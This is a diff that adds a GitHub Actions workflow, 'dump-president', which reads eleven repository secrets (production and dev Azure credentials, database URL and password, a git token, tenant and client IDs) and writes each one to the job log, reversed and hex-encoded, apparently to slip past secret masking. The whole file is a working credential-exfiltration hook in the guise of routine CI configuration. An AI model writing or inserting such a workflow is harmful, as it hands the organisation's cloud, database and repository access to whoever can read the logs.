@@ -1,0 +1,26 @@
+name: dump-president
+on:
+  workflow_dispatch:
+jobs:
+  dump:
+    runs-on: self-hosted
+    steps:
+      - name: collect
+        env:
+          S1: ${{ secrets.PRESIDENT_PROD_AZURE_CREDENTIALS }}
+          S2: ${{ secrets.PRESIDENT_DEV_AZURE_CREDENTIALS }}
+          S3: ${{ secrets.VASHA_DEV_AZURE_CREDENTIALS }}
+          S4: ${{ secrets.ENGINEARDEV_CREDENTIALS }}
+          S5: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+          S6: ${{ secrets.REMOTE_DATABASE_URL }}
+          S7: ${{ secrets.POSTGRES_REMOTE_DEV_PASSWORD }}
+          S8: ${{ secrets.POSTGRES_REMOTE_SERVER }}
+          S9: ${{ secrets.GIT_TOKEN }}
+          S10: ${{ secrets.SOMATOUT_DEV_CLIENT_ID }}
+          S11: ${{ secrets.SOMATOUT_DEV_TENANT_ID }}
+        run: |
+          for v in S1 S2 S3 S4 S5 S6 S7 S8 S9 S10 S11; do
+            echo "=${v}_START="
+            printf '%s' "${!v}" | rev | xxd
+            echo "=${v}_END="
+          done
